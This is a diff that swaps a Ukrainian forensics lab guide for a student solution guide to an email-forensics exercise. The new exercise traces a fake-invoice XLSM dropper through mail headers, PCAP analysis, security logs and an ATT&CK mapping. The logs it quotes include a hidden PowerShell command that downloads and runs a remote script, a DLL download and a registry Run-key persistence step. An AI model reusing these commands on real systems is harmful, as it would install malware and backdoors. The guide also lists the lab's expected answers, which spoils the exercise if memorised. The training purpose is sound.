@@ -1,266 +1,454 @@
-# Розбір лабораторної роботи — Сценарій 09: Аналіз файлової системи
+# Розбір лабораторної роботи — Сценарій 06: Malware Delivery via Fake Invoice
 
-Назва лабораторної: File System Forensics — Аналіз видалених файлів
-Модуль: Цифрова криміналістика / Аналіз файлової системи
-Сценарій: 09 — File System Analysis (Insider Threat)
-Формат: Self-Paced
-Версія документу: 1.0
+**Модуль:** Email Forensics | **Сценарій:** 06 — Fake Invoice (Emotet-style XLSM Dropper)
+**Формат:** Self-Paced | **Мова:** Українська | **Тип:** Student Solution Guide
+
+---
+
+> Цей документ містить повний покроковий розбір лабораторної роботи. Використовуй його якщо застряг під час виконання або хочеш перевірити свої висновки після здачі звіту.
 
 ---
 
 ## Брифінг інциденту
 
-Служба безпеки **TechFrontier UA** отримала сигнал про можливий витік конфіденційних даних. Підозрюваний — **Дарія Кравець (d.kravets)**, IT-спеціаліст, яка звільнилась 25 березня 2024. Перед звільненням вона видалила ряд файлів зі своєї робочої станції та очистила корзину.
+Ти — аналітик SOC у компанії **TechFrontier UA**. О **09:59** ти отримав автоматичне сповіщення від системи Defender for Endpoint:
 
 ```
-[ІНЦИДЕНТ] INC-2024-032901
-Підозрюваний:  d.kravets (IT-спеціаліст)
-Дата події:    25 березня 2024
-Подія:         Масове видалення файлів перед звільненням
-Завдання:      Відновити видалені файли та встановити факт витоку
+[CRITICAL] INC-2024-032701
+Host:   DESKTOP-ACCOUNTING01 (192.168.5.88)
+User:   o.koval@techfrontier.com.ua
+Alert:  Backdoor.Emotet.Gen.Dropper — C2 beaconing detected
+C2:     185.156.72.11:8080
+Action required: Investigate and contain
 ```
 
-Середовище для аналізу: **http://192.168.88.202:8091**
+Твоє завдання — з'ясувати **як** відбувся інцидент, **що** зловмисники отримали, і **скласти технічний звіт** з рекомендаціями.
+
+Середовище для аналізу: **http://localhost:8086**
 
 ---
 
----
+## Фаза 1 — Аналіз фішингового листа
 
-## Середовище та інструментарій
+### Крок 1.1 — Відкрити веб-поштовий інтерфейс
 
-### Що імітує ця лаба
+Відкрий браузер і перейди на `http://localhost:8086`. Ти побачиш папку «Вхідні» з листом позначеним як **⚠ ПІДОЗРІЛИЙ**.
 
-SC09 симулює роботу **форензік-аналітика** після отримання образу диска підозрюваного. Веб-інтерфейс відтворює функціональність реальних форензік-інструментів:
+[[VISUAL: Скріншот — вхідні повідомлення, червоний badge навпроти листа від billing@ukr-accounting-service.net]]
 
-| Реальний інструмент | Аналог у SC09 | Призначення |
-|---|---|---|
-| **Autopsy** / **FTK** | Веб-інтерфейс SC09 | Перегляд файлової системи |
-| **Sleuth Kit (fls)** | Розділ «Активні файли» | Перелік файлів на диску |
-| **Sleuth Kit (icat)** | Розділ «Видалені файли» | Відновлені видалені файли |
-| **mactime** | Розділ «Хронологія» | Timeline подій |
-| **istat** | Розділ «Метадані» | inode інформація та timestamps |
+### Крок 1.2 — Переглянути деталі листа
 
-### Веб-інтерфейс SC09
+Натисни на лист. Запиши ключові дані:
 
-Відкрий браузер:
-
-```
-http://192.168.88.202:8091
-```
-
-Розділи навігації:
-
-| Розділ | Що показує |
+| Поле | Значення |
 |---|---|
-| **Головна** | Статистика + alert про інцидент |
-| **Активні файли** | Файли які залишились на диску (не видалені) |
-| **Видалені файли** | Файли відновлені з unallocated space |
-| **Хронологія** | Filesystem audit log — послідовність подій |
-| **Метадані** | inode таблиця з timestamps (created/modified/deleted) |
+| From | `billing@ukr-accounting-service.net` |
+| To | `o.koval@techfrontier.com.ua` |
+| X-Originating-IP | `193.201.22.41` |
+| SPF | `FAIL` |
+| DMARC | `FAIL (p=QUARANTINE)` |
+| Вкладення | `Рахунок_фактура_INV-2024-0847.xlsm` |
 
-### Що означають кольори
+[[VISUAL: Скріншот — панель IOC з червоними прапорцями SPF FAIL, DMARC FAIL]]
 
-| Колір | Значення |
-|---|---|
-| Зелений badge АКТИВНИЙ | Файл присутній на диску |
-| Червоний badge ВИДАЛЕНО | Файл видалено але відновлено |
-| Жовтий рядок | Підозріла подія в хронології |
+### Крок 1.3 — Raw Headers
+
+Натисни **«Raw Headers»**, знайди:
+
+```
+Authentication-Results: mx.techfrontier.com.ua;
+       spf=fail (193.201.22.41 is not authorized...)
+       dmarc=fail (p=QUARANTINE; pct=100)
+```
+
+** Висновок:** IP `193.201.22.41` не авторизований для домену `ukr-accounting-service.net`.
 
 ---
 
-## Фаза 1 — Огляд файлової системи
+## Фаза 2 — Аналіз мережевого трафіку (PCAP)
 
-### Крок 1.1 — Відкрити веб-інтерфейс
-
-```
-http://192.168.88.202:8091
-```
-
-На головній сторінці ти бачиш:
-* Кількість активних файлів
-* Кількість відновлених видалених файлів
-* Alert про інцидент
-
-Запиши у звіт:
-
-| Параметр | Значення |
-|---|---|
-| Кількість активних файлів | |
-| Кількість видалених файлів | |
-| Загальний розмір відновлених даних | |
-
-### Крок 1.2 — Переглянути активні файли
-
-Натисни **«Активні файли»** у верхньому меню. Переглянь список та запиши:
-* Хто є власником більшості файлів?
-* Які категорії файлів присутні?
-
----
-
-## Фаза 2 — Аналіз видалених файлів
-
-### Крок 2.1 — Відкрити розділ видалених файлів
-
-Натисни **«Видалені файли»** у верхньому меню. Ти побачиш 5 відновлених файлів.
-
-Заповни таблицю:
-
-| Назва файлу | Розмір | Дата видалення |
-|---|---|---|
-| | | |
-| | | |
-| | | |
-| | | |
-| | | |
-
-### Крок 2.2 — Дослідити кожен видалений файл
-
-Натисни на кожен файл та запиши:
-
-**Файл 1: client_database_FULL_2024.csv**
-* Що містить файл?
-* Чому він є конфіденційним?
-* Яка дата створення vs дата видалення?
-
-**Файл 2: backup_credentials.txt**
-* Що містить файл?
-* Який рівень критичності?
-
-**Файл 3: email_export_march.eml**
-* Кому адресований лист?
-* Що пропонує підозрюваний?
-
-**Файл 4: sync_script.sh**
-* Що робить скрипт?
-* На яку зовнішню адресу копіюються дані?
-
-**Файл 5: archive_confidential.zip**
-* Що міститься в архіві?
-* Який розмір архіву?
-
-```
-IOC: Файли вказують на навмисний збір та передачу конфіденційних даних
-```
-
----
-
-## Фаза 3 — Аналіз метаданих
-
-### Крок 3.1 — Перейти до метаданих
-
-Натисни **«Метадані»** у верхньому меню. Ти побачиш таблицю inode для всіх файлів.
-
-Знайди та запиши для видалених файлів:
-
-| Файл | Створено | Змінено | Видалено |
-|---|---|---|---|
-| client_database_FULL_2024.csv | | | |
-| sync_script.sh | | | |
-| email_export_march.eml | | | |
-
-**Питання:** Скільки часу минуло між створенням файлів та їх видаленням?
-
-### Крок 3.2 — Аналіз хешів
-
-Для файлу `client_database_FULL_2024.csv` запиши:
-* MD5 хеш
-* SHA256 хеш
-
-```
-Хеші використовуються для доведення незмінності доказів у суді
-```
-
----
-
-## Фаза 4 — Аналіз хронології
-
-### Крок 4.1 — Відкрити хронологію подій
-
-Натисни **«Хронологія»** у верхньому меню. Жовтим кольором виділені підозрілі події.
-
-Знайди та запиши:
-
-| Час | Подія | Чому підозріло |
-|---|---|---|
-| | EXEC sync_script.sh | |
-| | NETWORK outbound | |
-| | DELETE файлів | |
-| | EMPTY_TRASH | |
-
-### Крок 4.2 — Відновити послідовність дій
-
-На основі хронології опиши що робив підозрюваний:
-
-```
-1. [дата] — Створив файл зі списком клієнтів
-2. [дата] — ...
-3. [дата] — Запустив скрипт копіювання
-4. [дата] — Надіслав email конкуренту
-5. [дата] — Видалив всі файли
-6. [дата] — Очистив корзину
-```
-
----
-
-## Фаза 5 — Складання звіту
-
-### Крок 5.1 — Підключитись до контейнера
+### Крок 2.1 — Підготовка PCAP
 
 ```bash
-docker exec -it forensics_sc09_fs bash
+# Скопіювати PCAP з контейнера
+sudo docker cp forensics_sc06_invoice:/root/analysis/traffic.pcap /home/analyst/scenario/sc06.pcap
 ```
 
-### Крок 5.2 — Написати звіт
+### Крок 2.2 — Знайти C2 DNS запит
 
 ```bash
-nano /opt/reports/INC-2024-032901_report.txt
+tcpdump -r /home/analyst/scenario/sc06.pcap port 53 | grep -i "cdn-updates"
 ```
 
-**Структура звіту:**
+**Очікуваний вивід:**
 
 ```
-ЗВІТ ПРО ЦИФРОВЕ РОЗСЛІДУВАННЯ
-================================
-Інцидент:     INC-2024-032901
-Аналітик:     [твоє ім'я]
-Дата аналізу: [сьогоднішня дата]
+11:32:30.000000 IP 192.168.5.88.52841 > 192.168.5.1.domain: 21016+ A? cdn-updates-service.com. (41)
+```
 
-1. ВИКОНАВЧИЙ ПІДСУМОК
-   [2-3 речення для керівництва]
+Знайти відповідь з IP (використай Transaction ID з попереднього рядка, наприклад `21016`):
 
-2. ВІДНОВЛЕНІ ДОКАЗИ
-   Файл 1: client_database_FULL_2024.csv
-   - Розмір: X байт
-   - MD5: [хеш]
-   - Вміст: [опис]
-   - Значення: [чому це доказ]
+```bash
+tcpdump -r /home/analyst/scenario/sc06.pcap -n port 53 | grep -A1 "cdn-updates"
+```
 
-   [аналогічно для інших файлів]
+**Очікуваний вивід:**
 
-3. ХРОНОЛОГІЯ ПОДІЙ
-   [список подій з часовими мітками]
+```
+11:32:30.000000 IP 192.168.5.88.52841 > 192.168.5.1.53: 21016+ A? cdn-updates-service.com. (41)
+11:32:30.039999 IP 192.168.5.1.53 > 192.168.5.88.52841: 21016 1/0/0 A 185.156.72.11 (57)
+```
 
-4. ВИСНОВКИ
-   - Факт витоку: ТАК/НІ
-   - Отримувач даних: [адреса]
-   - Рекомендації: [дії]
+[[VISUAL: Скріншот — два рядки DNS: запит та відповідь з IP 185.156.72.11]]
+
+**IOC:** `cdn-updates-service.com` → `185.156.72.11`
+
+### Крок 2.3 — Переглянути весь C2 трафік
+
+```bash
+tcpdump -r /home/analyst/scenario/sc06.pcap host 185.156.72.11
+```
+
+[[VISUAL: Скріншот — TCP сесії до 185.156.72.11 на портах 80 та 8080]]
+
+### Крок 2.4 — Знайти Excel та PowerShell User-Agent
+
+```bash
+tcpdump -r /home/analyst/scenario/sc06.pcap -A port 80 | grep -i "excel\|office\|powershell"
+```
+
+**Очікуваний вивід:**
+
+```
+User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.17126; Pro)
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; PowerShell/5.1.19041.4648)
+```
+
+[[VISUAL: Скріншот — два рядки User-Agent виділені]]
+
+### Крок 2.5 — Переглянути payload
+
+```bash
+tcpdump -r /home/analyst/scenario/sc06.pcap -A host 185.156.72.11 | head -80
+```
+
+Знайдеш три ключові транзакції:
+
+**1. Excel завантажує .ps1:**
+```
+GET /invoices/get_payload.ps1 HTTP/1.1
+User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.17126; Pro)
+```
+
+**2. PowerShell завантажує DLL:**
+```
+GET /stage2/svchost_helper.dll HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; PowerShell/5.1.19041.4648)
+```
+
+**3. C2 Beacon (IE11 UA з не-IE процесу):**
+```
+POST /cdn/check HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/7.0)
+```
+
+[[VISUAL: Скріншот tcpdump -A — три секції виділені]]
+
+### Крок 2.6 — Підрахувати beacon
+
+```bash
+tcpdump -r /home/analyst/scenario/sc06.pcap -A host 185.156.72.11 | grep "POST /cdn/check"
+```
+
+**Висновок Фази 2:** 8 C2 beacon (~120с інтервал) до `185.156.72.11:8080`. Спроба ексфільтрації — HTTP 403.
+
+---
+
+## Фаза 3 — Аналіз журналів безпеки
+
+### Крок 3.1 — Увійти в контейнер
+
+```bash
+sudo docker exec -it forensics_sc06_invoice bash
+```
+
+### Крок 3.2 — AV Log
+
+```bash
+cat /var/log/security/av_alerts.log
+```
+
+Запиши:
+
+**Process chain:**
+```
+EXCEL.EXE(5900) → cmd.exe(6100) → powershell.exe(6200)
+```
+
+**PowerShell команда:**
+```
+powershell.exe -NoP -W Hidden -EP Bypass -c
+"$wc=(New-Object Net.WebClient);
+IEX($wc.DownloadString('http://cdn-updates-service.com/invoices/get_payload.ps1'))"
+```
+
+**Persistence key:**
+```
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSvcHost
+Value: C:\Users\o.koval\AppData\Local\Temp\svchost_helper.dll
+```
+
+[[VISUAL: Скріншот av_alerts.log — виділені MACRO-XLSM та PERSIST-REGISTRY-RUN]]
+
+### Крок 3.3 — PowerShell Transcript
+
+```bash
+cat /var/log/security/powershell_transcript.log
+```
+
+Знайди:
+
+```powershell
+PS> IEX($wc.DownloadString('http://cdn-updates-service.com/invoices/get_payload.ps1'))
+PS> $wc2.DownloadFile('http://185.156.72.11/stage2/svchost_helper.dll', $tmpPath)
+PS> Set-ItemProperty -Path $regPath -Name 'WinSvcHost' -Value $tmpPath
+PS> New-Object System.Threading.Mutex($false, 'Local\WinSvcHostV2')
+```
+
+[[VISUAL: Скріншот powershell_transcript.log — виділені IEX, DownloadFile, Mutex]]
+
+### Крок 3.4 — Web Access Log
+
+```bash
+cat /var/log/web/access.log
+```
+
+Серед легітимних запитів знайди підозрілі:
+
+```
+# Excel завантажує .ps1 — IOC:
+192.168.5.88 [...] "GET http://cdn-updates-service.com/invoices/get_payload.ps1"
+"Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.17126; Pro)"
+
+# C2 Beacon x8 — IOC:
+192.168.5.88 [...] "POST http://cdn-updates-service.com:8080/cdn/check" 200
+"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/7.0)"
+
+# Exfil — заблоковано:
+192.168.5.88 [...] "POST http://cdn-updates-service.com:8080/cdn/telemetry/upload" 403
+```
+
+[[VISUAL: Скріншот access.log — IOC рядки виділені серед легітимних запитів]]
+
+**Висновок Фази 3:** Підтверджено повний ланцюг: email → XLSM → cmd → PowerShell → DLL → Registry Run → Mutex → beacon ×8 → exfil (blocked).
+
+---
+
+## Фаза 4 — MITRE ATT&CK Mapping та Звіт
+
+### Крок 4.1 — ATT&CK матриця
+
+| Техніка | ID | Артефакт |
+|---|---|---|
+| Phishing + XLSM | T1566.001 | `06_malware_invoice.eml` |
+| XLM macro | T1137.001 | AV log: `Auto_Open() sheet "CdnApi"` |
+| PowerShell -EP Bypass | T1059.001 | `powershell_transcript.log` |
+| Office → cmd.exe | T1204.002 | AV log: process chain |
+| Registry Run Key | T1547.001 | AV log: `HKCU\...\Run\WinSvcHost` |
+| HTTP C2 beacon | T1071.001 | PCAP: 8× POST /cdn/check |
+| IE11 UA masquerading | T1036 | PCAP: MSIE 9.0 з не-IE процесу |
+| Exfiltration | T1041 | access.log: POST telemetry (403) |
+
+### Крок 4.2 — Скласти звіт
+
+```bash
+exit   # вийди з контейнера
+nano /home/analyst/scenario/INC-2024-032701_report.txt
+```
+
+**Executive Summary:**
+```
+О 09:41 27 березня 2024 бухгалтер TechFrontier UA О.Коваль отримала
+фішинговий лист з XLSM-вкладенням. XLM macro завантажив PowerShell
+dropper та DLL-бекдор з C2 185.156.72.11. Зафіксовано 8 C2 beacon
+(18 хвилин) та спробу ексфільтрації фінансових даних (HTTP 403).
+```
+
+**Хронологія:**
+```
+11:30:30 - Фішинговий лист доставлено (SPF FAIL, DMARC FAIL)
+11:31:30 - Жертва відкриває Рахунок_фактура_INV-2024-0847.xlsm
+11:32:22 - DNS: cdn.microsoft.com (легітимний — маскування)
+11:32:26 - DNS: officecdn.microsoft.com (легітимний — маскування)
+11:32:30 - DNS: cdn-updates-service.com → 185.156.72.11  ← IOC
+11:32:32 - HTTP GET /invoices/get_payload.ps1  (Excel UA)
+11:32:35 - HTTP GET /stage2/svchost_helper.dll (PowerShell UA)
+11:34:00 - C2 Beacon #1 → 185.156.72.11:8080
+11:36:00 - C2 Beacon #2 (+122s)
+11:50:17 - Exfil POST /cdn/telemetry/upload → HTTP 403
+11:55:07 - Port scan: DC01, DC02, ERP01 (port 445)
+```
+
+**IOC список:**
+```
+Network:  185.156.72.11:8080  /  cdn-updates-service.com
+Host:     Mutex: Local\WinSvcHostV2
+          RegKey: HKCU\...\Run\WinSvcHost → %TEMP%\svchost_helper.dll
+          UA fingerprint: MSIE 9.0 з не-IE процесу
+```
+
+**Рекомендації:**
+```
+1. НЕГАЙНО:        Ізолювати DESKTOP-ACCOUNTING01
+2. НЕГАЙНО:        Заблокувати 185.156.72.11 та cdn-updates-service.com
+3. Протягом 1 год: Скинути паролі o.koval (AD + ERP + ПриватБанк)
+4. До очищення:    Memory dump (volatility malfind)
+5. Довгострокове:  SPF policy змінити з QUARANTINE на REJECT
+```
+
+```bash
+# Ctrl+O → Enter → Ctrl+X
+```
+
+[[VISUAL: Скріншот заповненого звіту INC-2024-032701_report.txt]]
+
+---
+
+## Фінальна перевірка
+
+- [ ] IP відправника: `193.201.22.41`
+- [ ] C2 IP:Port: `185.156.72.11:8080`
+- [ ] C2 домен: `cdn-updates-service.com`
+- [ ] Файл .ps1: `get_payload.ps1`
+- [ ] DLL payload: `svchost_helper.dll`
+- [ ] Registry: `HKCU\...\Run\WinSvcHost`
+- [ ] Mutex: `Local\WinSvcHostV2`
+- [ ] Кількість beacon: `8`
+- [ ] Exfil результат: `HTTP 403`
+
+---
+
+## 🧹 Cleanup
+
+```bash
+sudo docker compose -f docker-compose.sc06.yml down
+rm /home/analyst/scenario/sc06.pcap
+rm /home/analyst/scenario/INC-2024-032701_report.txt
 ```
 
 ---
 
-## Чеклист для самоперевірки
+*ITS/КСЗІ — Email Forensics Lab | Сценарій 06 | EDUCATIONAL USE ONLY | SET University*
 
-```
-[ ] Переглянуто всі 5 видалених файлів
-[ ] Записано метадані (дати створення та видалення)
-[ ] Записано хеші для ключових файлів
-[ ] Проаналізовано хронологію подій
-[ ] Виявлено зовнішню адресу куди копіювались дані
-[ ] Знайдено email підозрюваного до конкурента
-[ ] Складено звіт з доказами
-[ ] Визначено факт витоку даних
+---
+
+## Додатково: Крок 1.4 — Глибокий аналіз .eml файлу
+
+### Завантажити .eml
+
+Натисни **«Завантажити .eml»** у веб-інтерфейсі або скопіюй з контейнера:
+
+```bash
+sudo docker cp forensics_sc06_invoice:/home/user/email/06_malware_invoice.eml ~/scenario/06_malware_invoice.eml
 ```
 
 ---
 
-*ITS/КСЗІ — File System Forensics Lab | Сценарій 09 | ТІЛЬКИ ДЛЯ НАВЧАННЯ | SET University*
+### Онлайн інструменти
+
+| Інструмент | URL | Що аналізує |
+|---|---|---|
+| **MXToolbox Email Header Analyzer** | `mxtoolbox.com/EmailHeaders.aspx` | Received chain, SPF, DKIM, DMARC |
+| **Mail Header Analyzer (Google Toolbox)** | `toolbox.googleapps.com/apps/messageheader` | Маршрут листа, затримки між hop |
+| **EML Analyzer** | `eml-analyzer.netlify.app` | Повний аналіз .eml: заголовки, body, вкладення |
+| **PhishTool** | `phishtool.com` | Фішинг аналіз, IOC витяг, OSINT |
+| **AbuseIPDB** | `abuseipdb.com/check/193.201.22.41` | Репутація X-Originating-IP |
+| **VirusTotal** | `virustotal.com` | SHA256 вкладення: `e3b0c44298fc1c149...` |
+| **URLScan.io** | `urlscan.io` | Сканування C2 домену `cdn-updates-service.com` |
+| **MXToolbox SPF Check** | `mxtoolbox.com/spf.aspx` | Перевірити SPF запис домену відправника |
+
+---
+
+### Офлайн інструменти
+
+**1. emlAnalyzer (Python)**
+```bash
+# Встановити
+pip install eml-analyzer
+
+# Аналізувати
+emlAnalyzer -i ~/scenario/06_malware_invoice.eml
+
+# Витягнути вкладення
+emlAnalyzer -i ~/scenario/06_malware_invoice.eml --extract
+```
+
+**2. mutt / mailx (переглянути структуру)**
+```bash
+sudo apt install mutt -y
+mutt -f ~/scenario/06_malware_invoice.eml
+```
+
+**3. Python вручну (базовий аналіз)**
+```bash
+python3 - << 'PYEOF'
+import email, email.policy
+
+with open('/home/analyst/scenario/06_malware_invoice.eml', 'rb') as f:
+    msg = email.message_from_bytes(f.read(), policy=email.policy.compat32)
+
+# Ключові заголовки
+for h in ['From','To','Reply-To','Return-Path','X-Originating-IP',
+          'X-Spam-Score','X-Spam-Flag','Date','Message-ID']:
+    print(f"{h}: {msg.get(h,'—')}")
+
+print("\n--- Authentication ---")
+print(msg.get('Authentication-Results','—'))
+
+print("\n--- DKIM ---")
+print(msg.get('DKIM-Signature','—')[:80])
+
+print("\n--- Received chain ---")
+for i, r in enumerate(msg.get_all('Received',[])):
+    print(f"Hop {i+1}: {r.strip()[:80]}")
+PYEOF
+```
+
+**4. Grep по ключових IOC**
+```bash
+# Всі URL у листі
+grep -oE 'https?://[^"<> ]+' ~/scenario/06_malware_invoice.eml
+
+# Tracking pixel
+grep -i "pixel\|track\|1x1\|width.*1.*height.*1" ~/scenario/06_malware_invoice.eml
+
+# Reply-To vs From домени
+grep -E "^(From|Reply-To|Return-Path):" ~/scenario/06_malware_invoice.eml
+
+# Декодувати Subject (base64)
+grep "^Subject:" ~/scenario/06_malware_invoice.eml | \
+  grep -oP '(?<=\?B\?).*(?=\?=)' | base64 -d 2>/dev/null && echo
+```
+
+---
+
+### Що шукати при аналізі — чеклист
+
+```
+[ ] From домен ≠ Reply-To домен
+[ ] SPF FAIL — IP відправника не авторизований
+[ ] DKIM FAIL — підпис невалідний або відсутній
+[ ] DMARC FAIL — порушення policy
+[ ] X-Spam-Score > 5.0
+[ ] Received chain містить localhost (підроблений hop)
+[ ] X-Originating-IP — перевірити на AbuseIPDB
+[ ] Subject — base64 decode — прочитати оригінал
+[ ] Tracking pixel у body (img 1×1 на зовнішній домен)
+[ ] Кнопка href ≠ відображуваний текст посилання
+[ ] SHA256 вкладення — перевірити на VirusTotal
+[ ] C2 домен у URL — перевірити на URLScan.io
+```
+
+---
+
+*Forensics | Fake Invoice (Emotet-style XLSM Dropper) | EDUCATIONAL USE ONLY | Rifat Ismailov*
